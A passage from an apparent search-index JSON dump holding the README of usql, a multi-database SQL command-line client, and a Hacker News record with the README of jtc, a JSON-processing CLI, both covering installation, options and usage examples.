wishing to leverage the usql code base. As such, it is possible to embed or create a SQL command-line interface (e.g, for use by some other project as an \"official\" client) using the core usql source tree. Please refer to main.go to see how usql puts together its packages. usql's code is also well-documented -- please refer to the Go reference for an overview of the various packages and APIs. Database Support usql works with all Go standard library compatible SQL drivers supported by github.com/xo/dburl. The list of drivers that usql was built with can be displayed using the \\drivers command: $ cd $GOPATH/src/github.com/xo/usql $ export GO111MODULE=on # build excluding the base drivers, and including cassandra and moderncsqlite $ go build -tags 'no_postgres no_oracle no_sqlserver no_sqlite3 cassandra moderncsqlite' # show built driver support $ ./usql -c '\\drivers' Available Drivers: cql [ca, scy, scylla, datastax, cassandra] memsql (mysql) [me] moderncsqlite [mq, sq, file, sqlite, sqlite3, modernsqlite] mysql [my, maria, aurora, mariadb, percona] tidb (mysql) [ti] vitess (mysql) [vt] The above shows that usql was built with only the mysql, cassandra (ie, cql), and moderncsqlite drivers. The output above reflects information about the drivers available to usql, specifically the internal driver name, its primary URL scheme, the driver's available scheme aliases (shown in [...]), and the real/underlying driver (shown in (...)) for wire compatible drivers. Supported Database Schemes and Aliases The following are the Go SQL drivers that usql supports, the associated database, scheme / build tag, and scheme aliases: Database Scheme / Tag Scheme Aliases Driver Package / Notes Microsoft SQL Server sqlserver ms, mssql github.com/denisenkom/go-mssqldb MySQL mysql my, maria, aurora, mariadb, percona github.com/go-sql-driver/mysql Oracle Database oracle or, ora, oci, oci8, odpi, odpi-c github.com/sijms/go-ora/v2 PostgreSQL postgres pg, pgsql, postgresql github.com/lib/pq SQLite3 sqlite3 sq, file, sqlite github.com/mattn/go-sqlite3 Alibaba MaxCompute maxcompute mc sqlflow.org/gomaxcompute Apache Avatica avatica av, phoenix github.com/apache/calcite-avatica-go/v5 Apache H2 h2 github.com/jmrobles/h2go Apache Ignite ignite ig, gridgain github.com/amsokol/ignite-go-client/sql AWS Athena athena s3, aws github.com/uber/athenadriver/go Cassandra cassandra ca, scy, scylla, datastax, cql github.com/MichaelS11/go-cql-driver ClickHouse clickhouse ch github.com/ClickHouse/clickhouse-go Couchbase couchbase n1, n1ql github.com/couchbase/go_n1ql CSVQ csvq cs, csv, tsv, json github.com/mithrandie/csvq-driver Cznic QL ql cznic, cznicql modernc.org/ql Exasol exasol ex, exa github.com/exasol/exasol-driver-go Firebird firebird fb, firebirdsql github.com/nakagami/firebirdsql Genji genji gj github.com/genjidb/genji/driver Google BigQuery bigquery bq gorm.io/driver/bigquery/driver Google Spanner spanner sp github.com/cloudspannerecosystem/go-sql-spanner Microsoft ADODB adodb ad, ado github.com/mattn/go-adodb ModernC SQLite3 moderncsqlite mq, modernsqlite modernc.org/sqlite MySQL MyMySQL mymysql zm, mymy github.com/ziutek/mymysql/godrv Netezza netezza nz, nzgo github.com/IBM/nzgo PostgreSQL PGX pgx px github.com/jackc/pgx/v4/stdlib Presto presto pr, prs, prestos, prestodb, prestodbs github.com/prestodb/presto-go-client/presto SAP ASE sapase ax, ase, tds github.com/thda/tds SAP HANA saphana sa, sap, hana, hdb github.com/SAP/go-hdb/driver Trino trino tr, trs, trinos github.com/trinodb/trino-go-client/trino Vertica vertica ve github.com/vertica/vertica-sql-go VoltDB voltdb vo, vdb, volt github.com/VoltDB/voltdb-client-go/voltdbclient Apache Hive hive hi sqlflow.org/gohive Apache Impala impala im github.com/bippio/go-impala Azure CosmosDB cosmos cm github.com/btnguyen2k/gocosmos GO DRiver for ORacle godror gr github.com/godror/godror ODBC odbc od github.com/alexbrainman/odbc Snowflake snowflake sf github.com/snowflakedb/gosnowflake Amazon Redshift postgres rs, redshift github.com/lib/pq CockroachDB postgres cr, cdb, crdb, cockroach, cockroachdb github.com/lib/pq OLE ODBC adodb oo, ole, oleodbc github.com/mattn/go-adodb SingleStore MemSQL mysql me, memsql github.com/go-sql-driver/mysql TiDB mysql ti, tidb github.com/go-sql-driver/mysql Vitess Database mysql vt, vitess github.com/go-sql-driver/mysql NO DRIVERS no_base no base drivers (useful for development) MOST DRIVERS most all stable drivers ALL DRIVERS all all drivers NO <TAG> no_<tag> exclude driver with <tag> Requires CGO Wire compatible (see respective driver) Any of the protocol schemes/aliases shown above can be used in conjunction when connecting to a database via the command-line or with the \\connect command: # connect to a vitess database: $ usql vt://user:pass@host:3306/mydatabase $ usql (not connected)=> \\c vitess://user:pass@host:3306/mydatabase See the section below on connecting to databases for further details building DSNs/URLs for use with usql. Using After installing, usql can be used similarly to the following: # connect to a postgres database $ usql postgres://booktest@localhost/booktest # connect to an oracle database $ usql oracle://user:pass@host/oracle.sid # connect to a postgres database and run the commands contained in script.sql $ usql pg://localhost/ -f script.sql Command-line Options Supported command-line options: $ usql --help usql, the universal command-line interface for SQL databases Usage: usql [OPTIONS]... [DSN] Arguments: DSN database url Options: -c, --command=COMMAND ... run only single command (SQL or internal) and exit -f, --file=FILE ... execute commands from file and exit -w, --no-password never prompt for password -X, --no-rc do not read start up file -o, --out=OUT output file -W, --password force password prompt (should happen automatically) -1, --single-transaction execute as a single transaction (if non-interactive) -v, --set=, --variable=NAME=VALUE ... set variable NAME to VALUE -P, --pset=VAR[=ARG] ... set printing option VAR to ARG (see \\pset command) -F, --field-separator=FIELD-SEPARATOR ... field separator for unaligned output (default, \"|\") -R, --record-separator=RECORD-SEPARATOR ... record separator for unaligned output (default, \\n) -T, --table-attr=TABLE-ATTR ... set HTML table tag attributes (e.g., width, border) -A, --no-align unaligned table output mode -H, --html HTML table output mode -t, --tuples-only print rows only -x, --expanded turn on expanded table output -z, --field-separator-zero set field separator for unaligned output to zero byte -0, --record-separator-zero set record separator for unaligned output to zero byte -J, --json JSON output mode -C, --csv CSV output mode -G, --vertical vertical output mode -V, --version display version and exit Connecting to Databases usql opens a database connection by parsing a URL and passing the resulting connection string to a database driver. Database connection strings (aka \"data source name\" or DSNs) have the same parsing rules as URLs, and can be passed to usql via command-line, or to the \\connect or \\c commands. Connection strings look like the following: driver+transport://user:pass@host/dbname?opt1=a&opt2=b driver:/path/to/file /path/to/file Where the above are: Component Description driver driver scheme name or scheme alias transport tcp, udp, unix or driver name (for ODBC and ADODB) user username pass password host hostname dbname database name, instance, or service name/ID ?opt1=a&... additional database driver options (see respective SQL driver for available options) /path/to/file a path on disk Some databases, such as Microsoft SQL Server, or Oracle Database support a path component (ie, /dbname) in the form of /instance/dbname, where /instance is the optional service identifier (aka \"SID\") or database instance Driver Aliases usql supports the same driver names and aliases from the dburl package. Most databases have at least one or more alias - please refer to the dburl documentation for all supported aliases. Short Aliases All database drivers have a two character short form that is usually the first two letters of the database driver. For example, pg for postgres, my for mysql, ms for sqlserver (formerly known as mssql), or for oracle, or sq for sqlite3. Passing Driver Options Driver options are specified as standard URL query options in the form of ?opt1=a&obt2=b. Please refer to the relevant database driver's documentation for available options. Paths on Disk If a URL does not have a driver: scheme, usql will check if it is a path on disk. If the path exists, usql will attempt to use an appropriate database driver to open the path. If the specified path is a Unix Domain Socket, usql will attempt to open it using the MySQL driver. If the path is a directory, usql will attempt to open it using the PostgreSQL driver. If the path is a regular file, usql will attempt to open the file using the SQLite3 driver. Driver Defaults As with URLs, most components in the URL are optional and many components can be left out. usql will attempt connecting using defaults where possible: # connect to postgres using the local $USER and the unix domain socket in /var/run/postgresql $ usql pg:// Please see documentation for the database driver you are connecting with for more information. Connection Examples The following are example connection strings and additional ways to connect to databases using usql: # connect to a postgres database $ usql pg://user:pass@host/dbname $ usql pgsql://user:pass@host/dbname $ usql postgres://user:pass@host:port/dbname $ usql pg:// $ usql /var/run/postgresql $ usql pg://user:pass@host/dbname?sslmode=disable # Connect without SSL # connect to a mysql database $ usql my://user:pass@host/dbname $ usql mysql://user:pass@host:port/dbname $ usql my:// $ usql /var/run/mysqld/mysqld.sock # connect to a sqlserver database $ usql sqlserver://user:pass@host/instancename/dbname $ usql ms://user:pass@host/dbname $ usql ms://user:pass@host/instancename/dbname $ usql mssql://user:pass@host:port/dbname $ usql ms:// # connect to a sqlserver database using Windows domain authentication $ runas /user:ACME\\wiley /netonly \"usql mssql://host/dbname/\" # connect to a oracle database $ usql or://user:pass@host/sid $ usql oracle://user:pass@host:port/sid $ usql or:// # connect to a cassandra database $ usql ca://user:pass@host/keyspace $ usql cassandra://host/keyspace $ usql cql://host/ $ usql ca:// # connect to a sqlite database that exists on disk $ usql dbname.sqlite3 # NOTE: when connecting to a SQLite database, if the \"<driver>://\" or # \"<driver>:\" scheme/alias is omitted, the file must already exist on disk. # # if the file does not yet exist, the URL must incorporate file:, sq:, sqlite3:, # or any other recognized sqlite3 driver alias to force usql to create a new, # empty database at the specified path: $ usql sq://path/to/dbname.sqlite3 $ usql sqlite3://path/to/dbname.sqlite3 $ usql file:/path/to/dbname.sqlite3 # connect to a adodb ole resource (windows only) $ usql adodb://Microsoft.Jet.OLEDB.4.0/myfile.mdb $ usql \"adodb://Microsoft.ACE.OLEDB.12.0/?Extended+Properties=\\\"Text;HDR=NO;FMT=Delimited\\\"\" # connect with ODBC driver (requires building with odbc tag) $ cat /etc/odbcinst.ini [DB2] Description=DB2 driver Driver=/opt/db2/clidriver/lib/libdb2.so FileUsage = 1 DontDLClose = 1 [PostgreSQL ANSI] Description=PostgreSQL ODBC driver (ANSI version) Driver=psqlodbca.so Setup=libodbcpsqlS.so Debug=0 CommLog=1 UsageCount=1 # connect to db2, postgres databases using ODBC $ usql odbc+DB2://user:pass@localhost/dbname $ usql odbc+PostgreSQL+ANSI://user:pass@localhost/dbname?TraceFile=/path/to/trace.log Executing Queries and Commands The interactive intrepreter reads queries and meta (\\ ) commands, sending the query to the connected database: $ usql sqlite://example.sqlite3 Connected with driver sqlite3 (SQLite3 3.17.0) Type \"help\" for help. sq:example.sqlite3=> create table test (test_id int, name string); CREATE TABLE sq:example.sqlite3=> insert into test (test_id, name) values (1, 'hello'); INSERT 1 sq:example.sqlite3=> select * from test; test_id | name +---------+-------+ 1 | hello (1 rows) sq:example.sqlite3=> select * from test sq:example.sqlite3-> \\p select * from test sq:example.sqlite3-> \\g test_id | name +---------+-------+ 1 | hello (1 rows) sq:example.sqlite3=> \\c postgres://booktest@localhost error: pq: 28P01: password authentication failed for user \"booktest\" Enter password: Connected with driver postgres (PostgreSQL 9.6.6) pg:booktest@localhost=> select * from authors; author_id | name +-----------+----------------+ 1 | Unknown Master 2 | blah 3 | aoeu (3 rows) pg:booktest@localhost=> Commands may accept one or more parameter, and can be quoted using either ' or \". Command parameters may also be backtick'd. Backslash Commands Currently available commands: $ usql Type \"help\" for help. (not connected)=> \\? General \\q quit usql \\copyright show usql usage and distribution terms \\drivers display information about available database drivers Query Execute \\g [(OPTIONS)] [FILE] or ; execute query (and send results to file or |pipe) \\crosstabview [(OPTIONS)] [COLUMNS] execute query and display results in crosstab \\G [(OPTIONS)] [FILE] as \\g, but forces vertical output mode \\gexec execute query and execute each value of the result \\gset [PREFIX] execute query and store results in usql variables \\gx [(OPTIONS)] [FILE] as \\g, but forces expanded output mode \\watch [(OPTIONS)] [DURATION] execute query every specified interval Query Buffer \\e [FILE] [LINE] edit the query buffer (or file) with external editor \\p show the contents of the query buffer \\raw show the raw (non-interpolated) contents of the query buffer \\r reset (clear) the query buffer \\w FILE write query buffer to file Help \\? [commands] show help on backslash commands \\? options show help on usql command-line options \\? variables show help on special variables Input/Output \\echo [-n] [STRING] write string to standard output (-n for no newline) \\qecho [-n] [STRING] write string to \\o output stream (-n for no newline) \\warn [-n] [STRING] write string to standard error (-n for no newline) \\o [FILE] send all query results to file or |pipe \\i FILE execute commands from file \\ir FILE as \\i, but relative to location of current script Informational \\d[S+] [NAME] list tables, views, and sequences or describe table, view, sequence, or index \\da[S+] [PATTERN] list aggregates \\df[S+] [PATTERN] list functions \\di[S+] [PATTERN] list indexes \\dm[S+] [PATTERN] list materialized views \\dn[S+] [PATTERN] list schemas \\ds[S+] [PATTERN] list sequences \\dt[S+] [PATTERN] list tables \\dv[S+] [PATTERN] list views \\l[+] list databases \\ss[+] [TABLE|QUERY] [k] show stats for a table or a query Formatting \\pset [NAME [VALUE]] set table output option \\a toggle between unaligned and aligned output mode \\C [STRING] set table title, or unset if none \\f [STRING] show or set field separator for unaligned query output \\H toggle HTML output mode \\T [STRING] set HTML <table> tag attributes, or unset if none \\t [on|off] show only rows \\x [on|off|auto] toggle expanded output Transaction \\begin begin a transaction \\commit commit current transaction \\rollback rollback (abort) current transaction Connection \\c URL connect to database with url \\c DRIVER PARAMS... connect to database with SQL driver and parameters \\Z close database connection \\password [USERNAME] change the password for a user \\conninfo display information about the current database connection Operating System \\cd [DIR] change the current working directory \\setenv NAME [VALUE] set or unset environment variable \\! [COMMAND] execute command in shell or start interactive shell \\timing [on|off] toggle timing of commands Variables \\prompt [-TYPE] <VAR> [PROMPT] prompt user to set variable \\set [NAME [VALUE]] set internal variable, or list all if no parameters \\unset NAME unset (delete) internal variable Features and Compatibility The usql project's goal is to support all standard psql commands and features. Pull Requests are always appreciated! Variables and Interpolation usql supports client-side interpolation of variables that can be \\set and \\unset: $ usql (not connected)=> \\set (not connected)=> \\set FOO bar (not connected)=> \\set FOO = 'bar' (not connected)=> \\unset FOO (not connected)=> \\set (not connected)=> A \\set variable, NAME, will be directly interpolated (by string substitution) into the query when prefixed with : and optionally surrounded by quotation marks (' or \"): pg:booktest@localhost=> \\set FOO bar pg:booktest@localhost=> select * from authors where name = :'FOO'; author_id | name +-----------+------+ 7 | bar (1 rows) The three forms, :NAME, :'NAME', and :\"NAME\", are used to interpolate a variable in parts of a query that may require quoting, such as for a column name, or when doing concatenation in a query: pg:booktest@localhost=> \\set TBLNAME authors pg:booktest@localhost=> \\set COLNAME name pg:booktest@localhost=> \\set FOO bar pg:booktest@localhost=> select * from :TBLNAME where :\"COLNAME\" = :'FOO' pg:booktest@localhost-> \\p select * from authors where \"name\" = 'bar' pg:booktest@localhost-> \\raw select * from :TBLNAME where :\"COLNAME\" = :'FOO' pg:booktest@localhost-> \\g author_id | name +-----------+------+ 7 | bar (1 rows) pg:booktest@localhost=> Note: variables contained within other strings will NOT be interpolated: pg:booktest@localhost=> select ':FOO'; ?column? +----------+ :FOO (1 rows) pg:booktest@localhost=> \\p select ':FOO'; pg:booktest@localhost=> Backtick'd parameters Meta (\\ ) commands support backticks on parameters: (not connected)=> \\echo Welcome `echo $USER` -- 'currently:' \"(\" `date` \")\" Welcome ken -- currently: ( Wed Jun 13 12:10:27 WIB 2018 ) (not connected)=> Backtick'd parameters will be passed to the user's SHELL, exactly as written, and can be combined with \\set: pg:booktest@localhost=> \\set MYVAR `date` pg:booktest@localhost=> \\set MYVAR = 'Wed Jun 13 12:17:11 WIB 2018' pg:booktest@localhost=> \\echo :MYVAR Wed Jun 13 12:17:11 WIB 2018 pg:booktest@localhost=> Passwords usql supports reading passwords for databases from a .usqlpass file contained in the user's HOME directory at startup: $ cat $HOME/.usqlpass # format is: # protocol:host:port:dbname:user:pass postgres:*:*:*:booktest:booktest $ usql pg:// Connected with driver postgres (PostgreSQL 9.6.9) Type \"help\" for help. pg:booktest@=> Note: the .usqlpass file cannot be readable by other users. Please set the permissions accordingly: Runtime Configuration (RC) File usql supports executing a .usqlrc contained in the user's HOME directory: $ cat $HOME/.usqlrc \\echo WELCOME TO THE JUNGLE `date` \\set SYNTAX_HL_STYLE paraiso-dark $ usql WELCOME TO THE JUNGLE Thu Jun 14 02:36:53 WIB 2018 Type \"help\" for help. (not connected)=> \\set SYNTAX_HL_STYLE = 'paraiso-dark' (not connected)=> The .usqlrc file is read by usql at startup in the same way as a file passed on the command-line with -f / --file. It is commonly used to set startup environment variables and settings. You can temporarily disable the RC-file by passing -X or --no-rc on the command-line: Host Connection Information By default, usql displays connection information when connecting to a database. This might cause problems with some databases or connections. This can be disabled by setting the system environment variable USQL_SHOW_HOST_INFORMATION to false: $ export USQL_SHOW_HOST_INFORMATION=false $ usql pg://booktest@localhost Type \"help\" for help. pg:booktest@=> SHOW_HOST_INFORMATION is a standard usql variable, and can be \\set or \\unset. Additionally, it can be passed via the command-line using -v or --set: $ usql --set SHOW_HOST_INFORMATION=false pg:// Type \"help\" for help. pg:booktest@=> \\set SHOW_HOST_INFORMATION true pg:booktest@=> \\connect pg:// Connected with driver postgres (PostgreSQL 9.6.9) pg:booktest@=> Syntax Highlighting Interactive queries will be syntax highlighted by default, using Chroma. There are a number of variables that control syntax highlighting: Variable Default Values Description SYNTAX_HL true true or false enables syntax highlighting SYNTAX_HL_FORMAT dependent on terminal support formatter name Chroma formatter name SYNTAX_HL_OVERRIDE_BG true true or false enables overriding the background color of the chroma styles SYNTAX_HL_STYLE monokai style name Chroma style name Time Formatting Some databases support time/date columns that support formatting. By default, usql formats time/date columns as RFC3339Nano, and can be set using \\pset time <FORMAT>: $ usql pg:// Connected with driver postgres (PostgreSQL 13.2 (Debian 13.2-1.pgdg100+1)) Type \"help\" for help. pg:postgres@=> \\pset time RFC3339Nano pg:postgres@=> select now(); now ----------------------------- 2021-05-01T22:21:44.710385Z (1 row) pg:postgres@=> \\pset time Kitchen Time display is \"Kitchen\" (\"3:04PM\"). pg:postgres@=> select now(); now --------- 10:22PM (1 row) pg:postgres@=> Any Go supported time format or the standard Go const name (for example, Kitchen, in the above). Constants Constant Name Value ANSIC Mon Jan _2 15:04:05 2006 UnixDate Mon Jan _2 15:04:05 MST 2006 RubyDate Mon Jan 02 15:04:05 -0700 2006 RFC822 02 Jan 06 15:04 MST RFC822Z 02 Jan 06 15:04 -0700 RFC850 Monday, 02-Jan-06 15:04:05 MST RFC1123 Mon, 02 Jan 2006 15:04:05 MST RFC1123Z Mon, 02 Jan 2006 15:04:05 -0700 RFC3339 2006-01-02T15:04:05Z07:00 RFC3339Nano 2006-01-02T15:04:05.999999999Z07:00 Kitchen 3:04PM Stamp Jan _2 15:04:05 StampMilli Jan _2 15:04:05.000 StampMicro Jan _2 15:04:05.000000 StampNano Jan _2 15:04:05.000000000 Copy usql implements the \\copy command that reads data from a database connection and writes it into another one. It requires 4 parameters: source connection string destination connection string source query destination table name, optionally with columns Connection strings support same syntax as in \\connect. Source query needs to be quoted. Source query must select same number of columns and in same order as they're defined in the destination table, unless they're specified for the destination, as table_name(column1, column2, ...). Quote the whole expression, if it contains spaces. \\copy does not attempt to perform any data type conversion. Use CAST in the source query to ensure data types compatible with destination table. Some drivers may have limited data type support, and they might not work at all when combined with other limited drivers. Unlike psql, \\copy in usql cannot read data directly from files. Drivers like csvq can help with this, since they support reading CSV and JSON files. $ cat books.csv book_id,author_id,isbn,title,year,available,tags 3,1,3,one,2018,\"2018-06-01 00:00:00\",{} 4,2,4,two,2019,\"2019-06-01 00:00:00\",{} $ usql -c \"\\copy csvq://. sqlite3://test.db 'select * from books' 'books'\" Copied 2 rows Note that it might be a better idea to use tools dedicated to the destination database to load data in a robust way. \\copy reads data from plain SELECT queries. Most drivers that have \\copy enabled use INSERT statements, except for PostgreSQL ones, which use COPY TO. Because data needs to be downloaded from one database and uploaded into another, don't expect same performance as in psql. For loading large amount of data efficiently, use tools native to the destination database. You can use \\copy with variables. Better yet, put those \\set commands in your runtime configuration file at $HOME/.usqlrc and passwords at $HOME/.usqlpass. $ usql Type \"help\" for help. (not connected)=> \\set pglocal postgres://postgres@localhost:49153?sslmode=disable (not connected)=> \\set oralocal godror://system@localhost:1521/orasid (not connected)=> \\copy :pglocal :oralocal 'select staff_id, first_name from staff' 'staff(staff_id, first_name)' Contributing usql is currently a WIP, and is aiming towards a 1.0 release soon. Well-written PRs are always welcome -- and there is a clear backlog of issues marked help wanted on the GitHub issue tracker! Please pick up an issue today, and submit a PR tomorrow! For more technical details, see CONTRIBUTING.md. Related Projects dburl - Go package providing a standard, URL-style mechanism for parsing and opening database connection URLs xo - Go command-line tool to generate Go code from a database schema ",
        "_version_": 1718527435361746944
      },
      {
        "story_id": [21196709],
        "story_author": ["vyuh"],
        "story_descendants": [40],
        "story_score": [122],
        "story_time": ["2019-10-08T20:17:59Z"],
        "story_title": "Jtc – CLI tool to extract, manipulate and transform source JSON",
        "search": [
          "Jtc – CLI tool to extract, manipulate and transform source JSON",
          "https://github.com/ldn-softdev/jtc",
          "jtc - cli tool to extract, manipulate and transform source JSON jtc stand for: JSON transformational chains (used to be JSON test console). jtc offers a powerful way to select one or multiple elements from a source JSON and apply various actions on the selected elements at once (wrap selected elements into a new JSON, filter in/out, sort elements, update elements, insert new elements, remove, copy, move, compare, transform, swap around and many other operations). Enhancement requests and/or questions are more than welcome: ldn.softdev@gmail.com Content: Short description Compilation and installation options Linux and MacOS precompiled binaries Installing via MacPorts Installation on Linux distributions Manual installation Release Notes Quick-start guide list all URLs dump all bookmark names dump all URL's names dump all the URLs and corresponding names Debugging and validating JSON Complete User Guide C++ class and interface usage primer jtc vs jq utility ideology learning curve handling irregular JSONs solutions input invariance programming model JSON numerical fidelity performance compare jtc based solutions with jq's Short description - jtc is a simple yet very powerful and efficient cli utility tool to process and manipulate JSON data jtc offers following features (a short list of main features): simple user interface allowing applying a bulk of changes in a single or chained sets of commands featured walk-path interface lets extracting any combination of data from sourced JSON trees extracted data is representable either as found, or could be encapsulated in JSON array/object or transformed using templates support Regular Expressions when searching source JSON fast and efficient processing of very large JSON files (various built-in search caches) insert/update operations optionally may undergo shell cli evaluation support in-place modifications of the input/source JSON file features namespaces, facilitating interpolation of preserved JSON values in templates supports buffered and streamed modes of input read sports concurrent input JSON reading/parsing (on multi-core CPU) written entirely in C++14, no dependencies (STL only, idiomatic C++, no memory leaks) extensively debuggable conforms JSON specification (json.org) The walk-path feature is easy to understand - it's only made of 2 kinds of lexemes traversing JSON tree, which could be mixed up in any order: subscripts - enclosed into [, ], subscripts let traversing JSON tree downwards (towards the leaves) and upwards (towards the root) search lexemes - encased as <..> or >..< (for a recursive and non-recursive searches respectively); search lexemes facilitate various match criteria defined by an optional suffix and/or quantifier There's also a 3rd kind of lexemes - directives: they typically facilitate other functions like working with namespaces, controlling walk-path execution, etc; directives are syntactically similar to the search lexemes All lexemes can be iterable: iterable subscripts let iterating over children of currently addressed JSON iterables nodes (arrays/objects), while iterable search lexemes let iterating over all (recursive) matches for a given search criteria A walk-path may have an arbitrary number of lexemes -the tool accepts a virtually unlimited number of walk paths. See below more detailed explanation with examples Compilation and installation options For compiling, c++14 (or later) is required. To compile under different platforms: MacOS/BSD: c++ -o jtc -Wall -std=c++14 -Ofast jtc.cpp Linux: non-relocatable (dynamically linked) image: c++ -o jtc -Wall -std=gnu++14 -Ofast -pthread -lpthread jtc.cpp relocatable (statically linked) image: c++ -o jtc -Wall -std=gnu++14 -Ofast -static -Wl,--whole-archive -lrt -pthread -lpthread -Wl,--no-whole-archive jtc.cpp Debian: c++ -o jtc -Wall -std=c++14 -pthread -lpthread -Ofast jtc.cpp (ensure c++ poits to clang++-6.0 or above) Following debug related flags could be passed to jtc when compiling: -DNDEBUG: compile w/o debugs, however it's unadvisable - there's no performance gain from doing so -DNDBG_PARSER: disable debugs coming from parsing JSON (handy when deep debugging huge JSONs and want to skip parsing debugs) -DBG_FLOW: all debuggable function/method calls will disply an entry and exit points -DBG_mTS, -DBG_uTS: display absolute time-stamps in the debug: with millisecond accuracy and with microsecond accuracy respectively -DBG_dTS: used with either of 2 previous flags: makes time-stamp to display delta (since last debug message) instead of absolute stamp -DBG_CC: every call to a copy-constructor in Jnode class will reveal itself (handy for optimization debugging) Linux and MacOS precompiled binaries are available for download Choose the latest precompiled binary: latest macOS if you don't want to go through macOS security hurdle, then remove the quarantine attribute from the file after binary download, e.g. (assuming you opened terminal in the folder where downloaded binary is): bash $ mv ./jtc-macos-64.latest ./jtc bash $ chmod 754 ./jtc bash $ xattr -r -d com.apple.quarantine ./jtc latest linux 64 bit latest linux 32 bit Rename the downloaded file and give proper permissions. E.g., for the latest macOS: mv jtc-macos-64.latest jtc chmod 754 jtc Packaged installations: Installing via MacPorts On MacOS, you can install jtc via the MacPorts package manager: $ sudo port selfupdate $ sudo port install jtc Installation on Linux distributions jtc is packaged in the following Linux distributions and can be installed via the package manager. Fedora: jtc is present in Fedora 31 and later: openSUSE: jtc can be installed on openSUSE Tumbleweed via zypper: or on Leap 15.0 and later by adding the utilities repository and installing jtc via zypper. Manual installation: download jtc-master.zip, unzip it, descend into unzipped folder, compile using an appropriate command, move compiled file into an install location. here're the example steps for MacOS: say, jtc-master.zip has been downloaded to a folder and the terminal app is open in that folder: unzip jtc-master.zip cd jtc-master c++ -o jtc -Wall -std=c++17 -Ofast jtc.cpp sudo mv ./jtc /usr/local/bin/ Release Notes See the latest Release Notes Quick-start guide: run the command jtc -g to read the mini USER-GUIDE, with walk path syntax, usage notes, short examples read the examples just below see stackoverflow-json for lots of worked examples based on Stack Overflow questions refer to the complete User Guide for further examples and guidelines. Consider a following JSON (a mockup of a bookmark container), stored in a file Bookmarks: { \"Bookmarks\": [ { \"children\": [ { \"children\": [ { \"name\": \"The New York Times\", \"stamp\": \"2017-10-03, 12:05:19\", \"url\": \"https://www.nytimes.com/\" }, { \"name\": \"HuffPost UK\", \"stamp\": \"2017-11-23, 12:05:19\", \"url\": \"https://www.huffingtonpost.co.uk/\" } ], \"name\": \"News\", \"stamp\": \"2017-10-02, 12:05:19\" }, { \"children\": [ { \"name\": \"Digital Photography Review\", \"stamp\": \"2017-02-27, 12:05:19\", \"url\": \"https://www.dpreview.com/\" } ], \"name\": \"Photography\", \"stamp\": \"2017-02-27, 12:05:19\" } ], \"name\": \"Personal\", \"stamp\": \"2017-01-22, 12:05:19\" }, { \"children\": [ { \"name\": \"Stack Overflow\", \"stamp\": \"2018-05-01, 12:05:19\", \"url\": \"https://stackoverflow.com/\" }, { \"name\": \"C++ reference\", \"stamp\": \"2018-06-21, 12:05:19\", \"url\": \"https://en.cppreference.com/\" } ], \"name\": \"Work\", \"stamp\": \"2018-03-06, 12:07:29\" } ] } 1. let's start with a simple thing - list all URLs: bash $ jtc -w'<url>l:' Bookmarks \"https://www.nytimes.com/\" \"https://www.huffingtonpost.co.uk/\" \"https://www.dpreview.com/\" \"https://stackoverflow.com/\" \"https://en.cppreference.com/\" Let's take a look at the walk-path <url>l:: search lexemes are enclosed in angular brackets <, > - that style provides a recursive search throughout JSON suffix l instructs to search among labels only quantifier : instructs to find all occurrences, such quantifiers makes a path iterable 2. dump all bookmark names from the Work folder: bash $ jtc -w'<Work>[-1][children][:][name]' Bookmarks \"Stack Overflow\" \"C++ reference\" Here the walk-path <Work>[-1][children][:][name] is made of following lexemes: a. <Work>: find within a JSON tree the first occurrence where the JSON string value is matching \"Work\" exactly b. [-1]: step up one tier in the JSON tree structure (i.e., address an immediate parent of the found JSON element) c. [children]: select/address a node whose label is \"children\" (it'll be a JSON array, at the same tier with Work) d. [:]: select each node in the array e. [name]: select/address a node with the label \"name\" in order to understand better how the walk-path works, let's run that series of cli in a slow-motion, gradually adding lexemes to the path one by one, perhaps with the option -l to see also the labels (if any) of the selected elements: bash $ jtc -w'<Work>' -l Bookmarks \"name\": \"Work\" bash $ jtc -w'<Work>[-1]' -l Bookmarks { \"children\": [ { \"name\": \"Stack Overflow\", \"stamp\": \"2018-05-01, 12:05:19\", \"url\": \"https://stackoverflow.com/\" }, { \"name\": \"C++ reference\", \"stamp\": \"2018-06-21, 12:05:19\", \"url\": \"https://en.cppreference.com/\" } ], \"name\": \"Work\", \"stamp\": \"2018-03-06, 12:07:29\" } bash $ jtc -w'<Work>[-1][children]' -l Bookmarks \"children\": [ { \"name\": \"Stack Overflow\", \"stamp\": \"2018-05-01, 12:05:19\", \"url\": \"https://stackoverflow.com/\" }, { \"name\": \"C++ reference\", \"stamp\": \"2018-06-21, 12:05:19\", \"url\": \"https://en.cppreference.com/\" } ] bash $ jtc -w'<Work>[-1][children][:]' -l Bookmarks { \"name\": \"Stack Overflow\", \"stamp\": \"2018-05-01, 12:05:19\", \"url\": \"https://stackoverflow.com/\" } { \"name\": \"C++ reference\", \"stamp\": \"2018-06-21, 12:05:19\", \"url\": \"https://en.cppreference.com/\" } bash $ jtc -w'<Work>[-1][children][:][name]' -l Bookmarks \"name\": \"Stack Overflow\" \"name\": \"C++ reference\" B.t.w., a better (a bit faster and more efficient) walk-path achieving the same query would be this: jtc -w'<Work>[-1][children]<name>l:' Bookmarks 3. dump all URL's names: bash $ jtc -w'<url>l:[-1][name]' Bookmarks \"The New York Times\" \"HuffPost UK\" \"Digital Photography Review\" \"Stack Overflow\" \"C++ reference\" this walk-path <url>l:[-1][name]: finds recursively (encasement <, >) each (:) JSON element with a label (l) matching url then for an each found JSON element, select its parent ([-1]) then, select a JSON (sub)element with the label \"name\" 4. dump all the URLs and their corresponding names, preferably wrap found pairs in JSON array: bash $ jtc -w'<url>l:' -w'<url>l:[-1][name]' -jl Bookmarks [ { \"name\": \"The New York Times\", \"url\": \"https://www.nytimes.com/\" }, { \"name\": \"HuffPost UK\", \"url\": \"https://www.huffingtonpost.co.uk/\" }, { \"name\": \"Digital Photography Review\", \"url\": \"https://www.dpreview.com/\" }, { \"name\": \"Stack Overflow\", \"url\": \"https://stackoverflow.com/\" }, { \"name\": \"C++ reference\", \"url\": \"https://en.cppreference.com/\" } ] yes, multiple walks (-w) are allowed option -j will wrap the walked outputs into a JSON array, but not just, option -l used together with -j will ensure relevant walks are grouped together (try without -l) if multiple walks (-w) are present, by default, walked results will be printed interleaved (if it can be interleaved) 5. Debugging and validating JSON jtc is extensively debuggable: the more times option -d is passed the more debugs will be produced. Enabling too many debugs might be overwhelming, though one specific case many would find extremely useful - when validating a failing JSON: bash $ <addressbook-sample.json jtc jtc json exception: expected_json_value If JSON is big, it's desirable to locate the parsing failure point. Passing just one -d let easily spotting the parsing failure point and its locus: bash $ <addressbook-sample.json jtc -d .display_opts(), option set[0]: -d (internally imposed: ) .init_inputs(), 